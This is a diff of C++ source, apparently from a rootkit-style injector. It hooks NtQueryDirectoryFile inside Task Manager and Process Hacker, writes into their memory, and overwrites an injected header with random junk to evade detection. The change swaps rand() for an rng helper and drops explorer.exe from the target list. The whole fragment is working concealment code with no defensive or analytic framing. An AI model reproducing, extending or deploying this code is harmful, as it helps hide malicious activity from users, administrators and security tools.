@@ -1,5 +1,6 @@
 #include "stdafx.h"
 #include "ntdll.hpp"
+#include "rng.hpp"
 
 using hook_container = std::vector<std::tuple<std::string, std::string, const char*>>;
 
@@ -23,7 +24,7 @@ int main()
 		{ "ntdll.dll", "NtQueryDirectoryFile",		"ntqdf"}
 	};
 
-	for (const auto& process_name : { "taskmgr.exe", "processhacker.exe", "explorer.exe" })
+	for (const auto& process_name : { "taskmgr.exe", "processhacker.exe"/*, "explorer.exe"*/ })
 	{
 		auto process_list = process::get_all_from_name(process_name);
 
@@ -52,7 +53,7 @@ int main()
 
 			// FILL HEADER SECTION WITH PSEUDO-RANDOM DATA WITH HIGH ENTROPY
 			auto junk_buffer = std::vector<std::uint8_t>(0x1000);
-			std::for_each(junk_buffer.begin(), junk_buffer.end(), [](auto& n) { n = rand() % 0x100; });
+			std::for_each(junk_buffer.begin(), junk_buffer.end(), [](auto& n) { n = rng::get_int<uint16_t>(0x00, 0xFF); });
 			proc.write_raw_memory(junk_buffer.data(), 0x1000, littlebro);
 		}
 	}
